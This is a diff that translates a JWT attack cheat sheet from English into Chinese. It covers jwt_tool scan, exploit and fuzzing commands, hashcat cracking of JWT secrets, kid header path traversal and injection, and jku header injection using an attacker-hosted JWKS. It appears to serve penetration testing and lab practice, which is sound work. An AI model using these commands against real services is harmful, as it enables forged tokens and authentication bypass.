+- 扫描: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
+- 利用: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
+- 模糊测试: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
+- 审查: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
 
 #### Hashcat
 
-> Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - [src](https://twitter.com/hashcat/status/955154646494040065)
+> 支持使用hashcat破解JWT（JSON Web Token），在单个GTX1080上速度达到365MH/s - [来源](https://twitter.com/hashcat/status/955154646494040065)
 
-- Dictionary attack: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
-- Rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
-- Brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`
+- 字典攻击: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
+- 基于规则的攻击: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
+- 暴力破解攻击: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`
 
-## JWT Claims
+## JWT声明
 
-[IANA's JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)
+[IANA的JSON Web Token声明](https://www.iana.org/assignments/jwt/jwt.xhtml)
 
-### JWT kid Claim Misuse
+### JWT kid声明滥用
 
-The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the JWT.
+JSON Web Token (JWT) 中的"kid"（密钥ID）声明是一个可选的头部参数，用于指示用于签名或加密JWT的加密密钥的标识符。重要的是要注意，密钥标识符本身不提供任何安全好处，而是使接收方能够定位验证JWT完整性的所需密钥。
 
-- Example #1 : Local file
+- 示例 #1 : 本地文件
 
     ```json
     {
@@ -409,7 +411,7 @@ The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header paramet
     }
     ```
 
-- Example #2 : Remote file
+- 示例 #2 : 远程文件
 
     ```json
     {
@@ -419,10 +421,10 @@ The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header paramet
     }
     ```
 
-The content of the file specified in the kid header will be used to generate the signature.
+kid头部中指定的文件内容将用于生成签名。
 
 ```js
-// Example for HS256
+// HS256示例
 HMACSHA256(
   base64UrlEncode(header) + "." +
   base64UrlEncode(payload),
@@ -430,10 +432,10 @@ HMACSHA256(
 )
 ```
 
-The common ways to misuse the kid header:
+滥用kid头部的常见方式：
 
-- Get the key content to change the payload
-- Change the key path to force your own
+- 获取密钥内容以更改载荷
+- 更改密钥路径以强制使用自己的密钥
 
     ```py
     >>> jwt.encode(
@@ -444,20 +446,20 @@ The common ways to misuse the kid header:
     ... )
     ```
 
-- Change the key path to a file with a predictable content.
+- 更改密钥路径为具有可预测内容的文件。
 
   ```ps1
   python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
   python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
   ```
 
-- Modify the kid header to attempt SQL and Command Injections
+- 修改kid头部以尝试SQL和命令注入
 
-### JWKS - jku header injection
+### JWKS - jku头部注入
 
-"jku" header value points to the URL of the JWKS file. By replacing the "jku" URL with an attacker-controlled URL containing the Public Key, an attacker can use the paired Private Key to sign the token and let the service retrieve the malicious Public Key and verify the token.
+"jku"头部值指向JWKS文件的URL。通过将"jku"URL替换为包含公钥的攻击者控制的URL，攻击者可以使用配对的私钥对令牌进行签名，然后让服务检索恶意公钥并验证令牌。
 
-It is sometimes exposed publicly via a standard endpoint:
+它有时通过标准端点公开暴露：
 
 - `/jwks.json`
 - `/.well-known/jwks.json`
@@ -466,7 +468,7 @@ It is sometimes exposed publicly via a standard endpoint:
 - `/api/v1/keys`
 - [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)
 
-You should create your own key pair for this attack and host it. It should look like that:
+您应该为此攻击创建自己的密钥对并托管它。它应该看起来像这样：
 
 ```json
 {
@@ -481,61 +483,61 @@ You should create your own key pair for this attack and host it. It should look 
 }
 ```
 
-**Exploit**:
+**利用**:
 
-- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
     ```ps1
     python3 jwt_tool.py JWT_HERE -X s
     python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
     ```
 
-- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
-    1. Generate a new RSA key and host it
-    2. Edit JWT's data
-    3. Replace the `kid` header with the one from your JWKS
-    4. Add a `jku` header and sign the JWT (`Don't modify header` option should be checked)
+- 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+    1. 生成新RSA密钥并托管
+    2. 编辑JWT的数据
+    3. 将`kid`头部替换为您JWKS中的那个
+    4. 添加`jku`头部并签署JWT（应选中"Don't modify header"选项）
 
-**Deconstructed**:
+**解构**:
 
 ```json
 {"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
 {"login":"admin"}.
-[Signed with new Private key; Public key exported]
+[使用新私钥签名；导出公钥]
 ```
 
-## Labs
+## 实验
 
-- [PortSwigger - JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
-- [PortSwigger - JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
-- [PortSwigger - JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
-- [PortSwigger - JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
-- [PortSwigger - JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
-- [PortSwigger - JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
-- [Root Me - JWT - Introduction](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)
-- [Root Me - JWT - Revoked token](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)
-- [Root Me - JWT - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
-- [Root Me - JWT - Unsecure File Signature](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
-- [Root Me - JWT - Public key](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
-- [Root Me - JWT - Header Injection](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
-- [Root Me - JWT - Unsecure Key Handling](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
+- [PortSwigger - 通过未验证签名绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
+- [PortSwigger - 通过有缺陷的签名验证绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
+- [PortSwigger - 通过弱签名密钥绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
+- [PortSwigger - 通过jwk头部注入绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
+- [PortSwigger - 通过jku头部注入绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
+- [PortSwigger - 通过kid头部路径遍历绕过JWT认证](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
+- [Root Me - JWT - 简介](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)
+- [Root Me - JWT - 已撤销令牌](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)
+- [Root Me - JWT - 弱密钥](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
+- [Root Me - JWT - 不安全的文件签名](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
+- [Root Me - JWT - 公钥](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
+- [Root Me - JWT - 头部注入](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
+- [Root Me - JWT - 不安全的密钥处理](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
 
-## References
+## 参考资料
 
-- [5 Easy Steps to Understanding JSON Web Token - Shaurya Sharma - December 21, 2019](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
-- [Attacking JWT authentication - Sjoerd Langkemper - September 28, 2016](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
-- [Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid - February 23, 2023](https://www.youtube.com/watch?v=d7wmUz57Nlg)
-- [Critical vulnerabilities in JSON Web Token libraries - Tim McLean - March 31, 2015](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
-- [Hacking JSON Web Token (JWT) - pwnzzzz - May 3, 2018](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
-- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify - February 9, 2017](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
-- [Hacking JSON Web Tokens - Vickie Li - October 27, 2019](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
-- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - August 27, 2017](https://nandynarwhals.org/hitbgsec2017-pasty/)
-- [How to Hack a Weak JWT Implementation with a Timing Attack - Tamas Polgar - January 7, 2017](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
-- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
-- [JSON Web Token Vulnerabilities - 0xn3va - March 27, 2022](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
-- [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8, 2017](https://trustfoundry.net/jwt-hacking-101/)
-- [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq - May 3, 2022](https://github.com/dwyl/learn-json-web-tokens)
-- [Privilege Escalation like a Boss - janijay007 - October 27, 2018](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
-- [Simple JWT hacking - Hari Prasanth (@b1ack_h00d) - March 7, 2019](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
-- [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - August 7, 2016](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
-- [Write up – JRR Token – LeHack 2019 - Laphaze - July 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
+- [理解JSON Web Token的5个简单步骤 - Shaurya Sharma - 2019年12月21日](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
+- [攻击JWT认证 - Sjoerd Langkemper - 2016年9月28日](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
+- [Club EH RM 05 - JSON Web Token利用简介 - Nishacid - 2023年2月23日](https://www.youtube.com/watch?v=d7wmUz57Nlg)
+- [JSON Web Token库中的严重漏洞 - Tim McLean - 2015年3月31日](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
+- [Hacking JSON Web Token (JWT) - pwnzzzz - 2018年5月3日](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
+- [Hacking JSON Web Tokens - 从零到英雄轻松搞定 - Websecurify - 2017年2月9日](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
+- [Hacking JSON Web Tokens - Vickie Li - 2019年10月27日](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
+- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - 2017年8月27日](https://nandynarwhals.org/hitbgsec2017-pasty/)
+- [如何通过时序攻击破解弱JWT实现 - Tamas Polgar - 2017年1月7日](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
+- [Auth0认证API中的JWT验证绕过 - Ben Knight - 2020年4月16日](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
+- [JSON Web Token漏洞 - 0xn3va - 2022年3月27日](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
+- [JWT攻击101 - TrustFoundry - Tyler Rosonke - 2017年12月8日](https://trustfoundry.net/jwt-hacking-101/)
+- [了解如何将JSON Web Token (JWT)用于身份验证 - @dwylhq - 2022年5月3日](https://github.com/dwyl/learn-json-web-tokens)
+- [权限提升像老板一样 - janijay007 - 2018年10月27日](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
+- [简单JWT攻击 - Hari Prasanth (@b1ack_h00d) - 2019年3月7日](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
+- [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - 2016年8月7日](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
+- [Write up – JRR Token – LeHack 2019 - Laphaze - 2019年7月7日](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
